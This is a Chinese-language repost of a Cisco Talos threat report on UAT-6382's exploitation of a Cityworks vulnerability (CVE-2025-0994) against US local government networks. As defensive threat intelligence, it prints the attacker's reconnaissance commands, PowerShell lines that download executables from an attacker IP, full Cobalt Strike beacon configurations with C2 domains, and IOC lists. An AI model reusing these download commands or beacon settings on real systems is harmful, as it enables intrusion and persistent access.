> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxMjYyMzkwOA==&mid=2247531375&idx=1&sn=15a705cf292ef9d6f2122c57749947de

#  UAT-6382 利用 Cityworks 零日漏洞传播恶意软件  
 Ots安全   2025-06-26 11:40  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
- 思科 Talos 发现流行资产管理系统 Cityworks 中存在远程代码执行漏洞  CVE-2025-0994被利用。  
  
- 网络安全和基础设施安全局(CISA) 和Trimble都发布了与此漏洞有关的公告，其中 Trimble 的公告特别列出了与利用 CVE 的入侵相关的入侵指标 (IOC)。    
  
- Talos 发现的涉及利用 CVE-2025-0994 的入侵的 IOC 与 Trimble 公告中列出的 IOC 重叠。    
  
- Talos 将这一系列利用 CVE-2025-0994 的入侵活动归类为“UAT-6382”活动。根据威胁行为者使用的工具以及策略、技术和程序 (TTP)，Talos 高度确信，此次利用以及随后的入侵活动是由使用中文的威胁行为者实施的。    
  
- 入侵后的活动包括在底层 IIS Web 服务器上快速部署诸如 AntSword 和 chinatso/Chopper 之类的 Web Shell。UAT-6382 还利用基于 Rust 的加载器部署 Cobalt Strike 和 VSHell 恶意软件，以维持长期持续访问。    
  
- 我们将基于 Rust 的加载器追踪为“TetraLoader”，它是使用最近公开的恶意软件构建框架“MaLoader”构建的。MaLoader 以简体中文编写，允许其操作员将 Shellcode 和其他有效载荷包装到基于 Rust 的二进制文件中，从而创建 TetraLoader。  
  
Talos 发现，自 2025 年 1 月首次利用漏洞以来，美国地方政府机构的企业网络就一直受到入侵。UAT-6382 成功利用CVE-2025-0944漏洞，进行侦察，并快速部署各种 Web Shell 和定制恶意软件，以保持长期访问权限。获得访问权限后，UAT-6382 明确表示有意转向公用事业管理相关系统。   
  
这些 Web Shell（包括 AntSword、chinatso/Chopper 和通用文件上传器）包含用中文编写的消息。此外，自定义工具 TetraLoader 是使用名为“MaLoader”的恶意软件构建器构建的，该构建器也用简体中文编写。根据该工具的性质、TTP（战术、技术、流程、键盘操作）以及受害者特征，Talos 高度确信 UAT-6382 是一个使用中文的威胁行为者。  
  
初步侦察   
  
成功利用存在漏洞的 Cityworks 应用程序后，攻击者可以进行初步侦察，以识别和指纹识别服务器：   
  

```
cmd.exe /c ipconfig 
cmd.exe /cpwd
cmd.exe /c dir 
cmd.exe /c dir .. 
cmd.exe /c dir c:\ 
cmd.exe /c dir c:\inetpub 
cmd.exe /c tasklist
```

  
  
 在尝试将 Web Shell 放入特定文件夹之前，对其进行了枚举：   
  

```
cmd.exe /c dir c:\inetpub\wwwroot 
cmd.exe /cc:\inetpub\wwwroot\CityworksServer\WebSite 
cmd.exe /c dir c:\inetpub\wwwroot\CityworksServer\WebSite\Assets
```

  
  
UAT-6382 大量利用 Web Shell   
  
初步侦察几乎立即促成了 Web Shell 的部署，以建立进入受感染网络的后门入口。这些 Web Shell 包含 AntSword、chinatso 和 Behinder 的多个变体，以及其他包含中文消息的通用文件上传器。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taduicLLfJsI4WspZZ3J8HUoNvHGCYCpAbkfv0fib0ibCQuiaic2dYI0YtaZ4cib7vxWQczFn6LcrT8QmHpQ/640?wx_fmt=webp&from=appmsg "")  
  
图 1. UAT-6382 部署的基于 ASP 的文件上传器。  
  
文件枚举和预处理以进行泄露   
  
UAT-6382 枚举了感兴趣的服务器上的多个目录，以识别它们感兴趣的文件，然后将它们暂存到已部署 Web Shell 的目录中，以便于数据泄露：   
  

```
cmd.exe /c dir c:\inetpub\wwwroot\CityworksServer\ 
cmd.exe /ccopyc:\inetpub\wwwroot\CityworksServer\<backup_archives>c:\inetpub\wwwroot\CityworksServer\Uploads\
```

  
  
部署后门   
  
UAT-6382 通过 PowerShell 在受感染系统上下载并部署了多个后门：   
  

```
cmd[.]exe /c powershell -Command Invoke-WebRequest -Uri 'hxxp[://]192[.]210[.]239[.]172:3219/LVLWPH[.]exe' -OutFile '<parent_directory>\LVLWPH[.]exe'  

cmd.exe /c powershell -Command Invoke-WebRequest -Uri 'http://192[.]210[.]239[.]172:3219/MCUCAT[.]exe' -OutFile 'C:\windows\temp\z1.exe'  

powershell -Command Invoke-WebRequest -Uri 'http://192[.]210[.]239[.]172:3219/TJPLYT[.]exe' -OutFile 'C:\windows\temp\z33.exe'  

cmd.exe /c powershell -Command Invoke-WebRequest -Uri'http://192[.]210[.]239[.]172:3219/z44[.]exe' -OutFile'C:\windows\temp\z44.exe'
```

  
  
Talos 恢复的植入程序是基于 Rust 的加载器，其中包含编码或加密的有效载荷。有效载荷由加载器组件解码/解密后注入到良性进程中。我们将这些加载器追踪为“ TetraLoader ” 。  
  
TetraLoader分析   
  
TetraLoader 是一款基于 Rust 的简单加载器。它会解码嵌入的有效载荷，并将其注入到良性进程（例如 notepad[.]exe）中以激活有效载荷。目前，Talos 已在受感染的终端上发现 TetraLoader 部署了两种类型的有效载荷：   
1. Cobalt Strike 信标：这些是与位置无关的、内存中的 Cobalt Strike 信标 shellcode，由 TetraLoader 注入到指定的良性进程中。   
  
1. VShell stager：位置无关的 shellcode，我们已将其确定为 VShell 的 stager，它与硬编码的 C2 服务器对话并执行发送给它的代码。   
  
TetraLoader 使用一个相对较新的有效载荷构建器框架“MaLoader”构建，该框架于 2024 年 12 月首次出现在 GitHub 上。MaLoader 有多种选项可以将 Shellcode 编码并嵌入到基于 Rust 的容器 TetraLoader 中。   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taduicLLfJsI4WspZZ3J8HUoNToKW9ibhvvgpZvVMYo4HibwTrIDmSZEMGib2GByFWmZlp3QFnYDVRTIaQ/640?wx_fmt=webp&from=appmsg "")  
  
图 2. MaLoader 的构建器界面  
  
MaLoader 是用简体中文编写的，这表明使用它的威胁行为者可能对该语言有相当高的熟练程度。  
  
Cobalt Strike 信标   
  
Cobalt Strike 信标相对简单，与传统生成的 Cobalt Strike 信标相比，变化不大。Talos 发现的其中一个信标可以连接到命令与控制 (C2) 域“cdn[.]lgaircon[.]xyz”，具体包含以下配置设置：  
  

```
BeaconType - HTTPS 
Port - 443
SleepTime - 45000
MaxGetSize - 2801745
Jitter - 37
MaxDNS - Not Found 
PublicKey - b'0\x81\x9f0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x81\x8d\x000\x81\x89\x02\x81\x81\x00\x81\x92\xaa\x1d\xdeph\xa6\x80\xf7\xc9\x7f\xcf\xba\xce6\xd9\x11(\x00\x1a\x95<\xa5\xdf\x19\x06\xf3\xd1;\xb1\x15\xe9\xdb\xcan\xc6\xba\xdb{\xd3\xc4,\xd4\xcf\xd1\x07\xe2\x1fI\x07%\xd2r\x9c\xa7\xd1z+Z\xdd\xac\xd0\x18\x04\x8e\xfbqp\xe1\xe1\xb81\xb1V\x12\xe4\x8d\xf0\xc0V\x1c\xf9\xc6\xca\xc8\xed\xc4,Y~\x17r\xebP)\xed\xa6\xba\xdc\xf5+\xedS.T\xdc\x8bl\xee&\x9e\x84\xb4a\xb1k\x9a\xc1x\x00q\r\xe6\xbfq\x02\x03\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

C2Server - cdn[.]lgaircon[.]xyz,/jquery-3[.]3[.]1[.]min[.]js 

UserAgent - Not Found 
HttpPostUri - /jquery-3[.]3[.]2[.]min[.]js 

HttpGet_Metadata - Not Found 
HttpPost_Metadata - Not Found 
SpawnTo - b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

PipeName - Not Found 

DNS_Idle - Not Found 
DNS_Sleep - Not Found 

SSH_Host - Not Found 
SSH_Port - Not Found 
SSH_Username - Not Found 
SSH_Password_Plaintext - Not Found 
SSH_Password_Pubkey - Not Found 

HttpGet_Verb - GET 
HttpPost_Verb - POST 
HttpPostChunk - 0

Spawnto_x86 - %windir%\syswow64\dllhost[.]exe
Spawnto_x64 - %windir%\sysnative\dllhost[.]exe

CryptoScheme - 0

Proxy_Config - Not Found 
Proxy_User - Not Found 
Proxy_Password - Not Found 
Proxy_Behavior - Use IE settings 
Watermark - 987654321
bStageCleanup - True 
bCFGCaution - False 
KillDate - 0
bProcInject_StartRWX - False 
bProcInject_UseRWX - False 
bProcInject_MinAllocSize - 17500

ProcInject_PrependAppend_x86 - b'\x90\x90'
                                  Empty 

ProcInject_PrependAppend_x64 - b'\x90\x90'
                                Empty 

ProcInject_Execute - ntdll:RtlUserThreadStart
                     CreateThread 
                     NtQueueApcThread-s 
                     CreateRemoteThread 
                     RtlCreateUserThread 

ProcInject_AllocationMethod - NtMapViewOfSection 

bUsesCookies - True 

HostHeader - Host: cdn[.]lgaircon[.]xyz
```

  
  
使用相同 C2 域的第二个信标包含以下更详细的配置：  
  

```
BeaconType - HTTPS 
Port - 443

SleepTime - 35000
MaxGetSize - 2097152
Jitter - 30
MaxDNS - Not Found 

PublicKey_MD5 - 00c96a736d29c55e29c5e3291aedb0fd 

C2Server - lgaircon[.]xyz,/owa/OPWiaTU-ZEbuwIAKGPHoQAP006-PTsjBGKQUxZorq2 
UserAgent - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15

HttpPostUri - /owa/idQ0RKiA2O1i9KKDzKRdmIBmkA8uQxmFzpBGRzGjaqG 

Malleable_C2_Instructions - NetBIOS decode 'a'

HttpGet_Metadata - ConstHeaders 
                  Host: lgaircon[.]xyz 
                  Accept: */ * 
                  Cookie: MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=ZG0yMzA2KjEs
                  ConstParams 
                  path=/calendar 
                  Metadata 
                  netbios 
                  parameter &#34;wa&#34;

HttpPost_Metadata - ConstHeaders 
                    Host: lgaircon[.]xyz 
                    Accept: */ * 
                    SessionId 
                    netbios 
                    prepend &#34;wla42=&#34;
                    prepend &#34;xid=730bf7;&#34;
                    prepend &#34;MSPAuth=3EkAjDKjI;&#34;
                    prepend &#34;ClientId=1C0F6C5D910F9;&#34;
                    prepend &#34;MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;&#34;
                    header &#34;Cookie&#34;
                    Output 
                    netbios 
                    parameter &#34;wa&#34;

PipeName - Not Found 
DNS_Idle - Not Found 
DNS_Sleep - Not Found 
SSH_Host - Not Found 
SSH_Port - Not Found 
SSH_Username - Not Found 
SSH_Password_Plaintext - Not Found 
SSH_Password_Pubkey - Not Found 
SSH_Banner - 

HttpGet_Verb - GET 
HttpPost_Verb - GET 
HttpPostChunk - 96

Spawnto_x86 - %windir%\syswow64\gpupdate[.]exe 
Spawnto_x64 - %windir%\sysnative\gpupdate[.]exe 

CryptoScheme - 0

Proxy_Config - Not Found 
Proxy_User - Not Found 
Proxy_Password - Not Found 
Proxy_Behavior - Use IE settings 

Watermark_Hash - NtZOV6JzDr9QkEnX6bobPg== 
Watermark - 987654321

bStageCleanup - True
bCFGCaution - False

KillDate - 0

bProcInject_StartRWX - True
bProcInject_UseRWX - False
bProcInject_MinAllocSize - 26808
ProcInject_PrependAppend_x86 - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
                                Empty 

ProcInject_PrependAppend_x64 - b'\x90\x90\x90\x90\x90\x90\x90\x90\x90'
                                Empty 

ProcInject_Execute - ntdll[.]dll:RtlUserThreadStart 
                     NtQueueApcThread-s 
                     SetThreadContext 
                     CreateRemoteThread 
                     kernel32[.]dll:LoadLibraryA 
                     RtlCreateUserThread 

ProcInject_AllocationMethod - VirtualAllocEx 

bUsesCookies - True
HostHeader - 
headersToRemove - Not Found 

DNS_Beaconing - Not Found 
DNS_get_TypeA - Not Found 
DNS_get_TypeAAAA - Not Found 
DNS_get_TypeTXT - Not Found 
DNS_put_metadata - Not Found 
DNS_put_output - Not Found 
DNS_resolver - Not Found 
DNS_strategy - round-robin 
DNS_strategy_rotate_seconds - -1
DNS_strategy_fail_x - -1
DNS_strategy_fail_seconds - -1
Retry_Max_Attempts - 0
Retry_Increase_Attempts - 0
Retry_Duration - 0
```

  
  
另一个信标连接到 C2“www[.]roomako[.]com”，并具有以下配置：   
  

```
BeaconType - HTTPS 
Port - 443
SleepTime - 25000
MaxGetSize - 2801745
Jitter - 37
MaxDNS - Not Found 

PublicKey - b&#34;0\x81\x9f0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x81\x8d\x000\x81\x89\x02\x81\x81\x00\xaa#\x18\xebx;\xd3?\xe7\xa7\xb5\x95\xb1\xe7\xb2a\x99O)\x8e\xebx/:\xc10c\xfe\x04#\xe5_ \x82\xab\x9d\xbe\x99\xd0W\xb5\xfafra\x14@\x9a\x16Fs5\xa0\xe6\xf3\xa6\x13\xdc\x91N\xdeql\x89\xc5RkD\xefq\xea\xa8\xc5'$\xdf]l#\xacs\x0c/;\xc3E\xf8\x0fS\x7f\xbd\xcd\x0b]E\x97\xf2\xf2Q\xe8\x00\xa7u\x04\x90\r\x95\xfd\xac`k9\xefa\xe5\x9ftW\xc5\xc7\x90\xb8\x8a\x15\xab+\x02\x03\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#34;

C2Server - www[.]roomako[.]com,/jquery-3[.]3[.]1[.]min[.]js 
UserAgent - Not Found 
HttpPostUri - /jquery-3[.]3[.]2[.]min[.]js 
HttpGet_Metadata - Not Found 
HttpPost_Metadata - Not Found 

SpawnTo - b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

PipeName - Not Found 

DNS_Idle - Not Found 
DNS_Sleep - Not Found 
SSH_Host - Not Found 
SSH_Port - Not Found 
SSH_Username - Not Found 
SSH_Password_Plaintext - Not Found 
SSH_Password_Pubkey - Not Found 

HttpGet_Verb - GET 
HttpPost_Verb - POST 
HttpPostChunk - 0

Spawnto_x86 - %windir%\syswow64\dllhost[.]exe
Spawnto_x64 - %windir%\sysnative\dllhost[.]exe

CryptoScheme - 0

Proxy_Config - Not Found 
Proxy_User - Not Found 
Proxy_Password - Not Found 
Proxy_Behavior - Use IE settings 

Watermark - 987654321
bStageCleanup - True 
bCFGCaution - False 
KillDate - 0

bProcInject_StartRWX - False 
bProcInject_UseRWX - False 
bProcInject_MinAllocSize - 17500
ProcInject_PrependAppend_x86 - b'\x90\x90\x90'
                              Empty 

ProcInject_PrependAppend_x64 - b'\x90\x90\x90'
                              Empty 

ProcInject_Execute - ntdll:RtlUserThreadStart
                     CreateThread 
                     NtQueueApcThread-s 
                     CreateRemoteThread 
                     RtlCreateUserThread 

ProcInject_AllocationMethod - NtMapViewOfSection 

  bUsesCookies - True 

HostHeader - Host: www[.]roomako[.]com
```

  
  
VShell 暂存器   
  
VShell stager 相对简单，使用基本的套接字 API 连接到硬编码的 C2 服务器，例如“192[.]210[.]239[.]172:2219”。stager 通常由 TetraLoader 注入到良性进程中，首先向 C2 发送一个初步信标，然后等待响应。C2 发送的响应通常是一个单字节异或载荷，然后由植入程序在内存中执行。这很可能是 UAT-6382 在 VShell 中的修改版本。   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taduicLLfJsI4WspZZ3J8HUoNLxSlVbafrWib35P4wKuQxeDUK2lbRFSaTxSwKxic4hhbhOXeeibVR5Jeg/640?wx_fmt=webp&from=appmsg "")  
  
图 3.植入程序从 C2 接收并执行 shellcode。  
  
VShell stager 收到的有效载荷实际上是真正的 VShell 植入体。VShell 是一种基于 GoLang 的植入体，可以与其 C2 通信，并提供各种基于远程访问木马的功能，例如在受感染的端点上执行文件管理、运行任意命令、截取屏幕截图以及运行基于 NPS 的代理。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taduicLLfJsI4WspZZ3J8HUoNN6hJsakLxLibno0S8fFFGwbPTa1UcoFaYO4CqLicfZDoXIvuPsCic8sMg/640?wx_fmt=webp&from=appmsg "")  
  
图 4. 连接了一个客户端的示例 VShell C2 服务器。   
  
与入侵事件中观察到的其他中文编写的工具一样，VShell C2 面板也是用中文编写的。尽管该面板提供了有限的英语支持，但如图 5 所示，它仍然主要使用中文，这表明攻击者需要熟悉该语言才能熟练使用该面板。   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taduicLLfJsI4WspZZ3J8HUoNPIsjFsOZUeHHNOaibYaQicP6j18U7rmrjgVhN0U9UNicybGJt5TQvibw5g/640?wx_fmt=webp&from=appmsg "")  
  
图 5. VShell 的文件管理器面板即使配置为使用英语，也使用中文。  
  
覆盖范围   
  
我们的客户可以检测和阻止此威胁的方法如下所列。    
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taduicLLfJsI4WspZZ3J8HUoNDMFPuic7gYRIOeufmHgscHV9ibzCWtDvu7v3cOt7uCHEC33wLCzicNRicQ/640?wx_fmt=jpeg&from=appmsg "")  
  
妥协指标 (IOC)   
  
TetraLoader   
  

```
14ed3878b6623c287283a8a80020f68e1cb6bfc37b236f33a95f3a64c4f4611f 
4ffc33bdc8527a2e8cb87e49cdc16c3b1480dfc135e507d552f581a67d1850a9 
1de72c03927bcd2810ce98205ff871ef1ebf4344fba187e126e50caa1e43250b 
1c38e3cda8ac6d79d9da40834367697a209c6b07e6b3ab93b3a4f375b161a901
```

  
  
CobaltStrike 信标   
  

```
C02d50d0eb3974818091b8dd91a8bbb8cdefd94d4568a4aea8e1dcdd8869f738
```

  
  
网络IOC   
  

```
cdn[.]phototagx[.]com
www[.]roomako[.]com
lgaircon[.]xyz
https://www[.]roomako[.]com/jquery-3[.]3[.]1[.]min[.]js 
https://lgaircon[.]xyz/owa/OPWiaTU-ZEbuwIAKGPHoQAP006-PTsjBGKQUxZorq2 
https://cdn[.]lgaircon[.]xyz/jquery-3[.]3[.]1[.]min[.]js 
hxxps[://]cdn[.]phototagx[.]com/ 

192[.]210[.]239[.]172
hxxp[://]192[.]210[.]239[.]172:3219/LVLWPH[.]exe
hxxp[://]192[.]210[.]239[.]172:3219/MCUCAT[.]exe
hxxp[://]192[.]210[.]239[.]172:3219/TJPLYT[.]exe
hxxp[://]192[.]210[.]239[.]172:3219/z44[.]exe
```

  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
